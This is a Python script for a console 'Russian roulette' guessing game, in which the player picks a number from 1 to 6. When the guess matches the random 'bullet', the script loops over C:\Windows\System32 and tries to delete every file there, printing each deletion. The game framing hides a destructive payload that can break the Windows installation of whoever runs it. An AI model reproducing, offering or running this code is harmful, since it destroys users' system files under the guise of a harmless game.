import random
import sys
import os
import time

def typewriter(text, period=0.05): #Function made by JustBoo72

    for i in text:

        time.sleep(period)
        print(end=i)
        sys.stdout.flush()

file = "C:\Windows\System32"
def game():
    typewriter("\n######### WELCOME TO RUSSIAN ROULETTE #########")
    for _ in range(3):
        typewriter("\n.")
    typewriter("\nSpinning the drum...")
    num = random.randint(1,6)
    typewriter("\nThe bullet is between 1, and 6. Don't guess its position.")
    guess = ""
    while True:
        try: 
            guess = int(input("\nYour guess: "))
            if guess >= 1 and guess <= 6:
                break
            else:
                typewriter("\nBetween 1 and 6, smartass.")   
        except ValueError:
            typewriter("\nYour input should be a number. Try again.")
    if num == guess:
        typewriter("\nYou lost and likely didn't even say goodbye.")
        typewriter("\nDeleting System32...")
        for filename in os.listdir(file):
            file_path = os.path.join(file, filename)
            try:
                os.remove(file_path)
                typewriter(f"\nDeleted file: {file_path}")
            except Exception as e:
                typewriter(f"\nFailed to delete {file_path}: {e}")
    else:
        typewriter("\nYou won. Oh well.")
        typewriter(f"\nThe bullet was in {num}.")
        
    if input("\nwould you like to play again? y/n: ") == "y":
        game()
    else:
        sys.exit()

print("\nStarting Russian Roulette...")
for _ in range(3):
    typewriter("\n.")

game()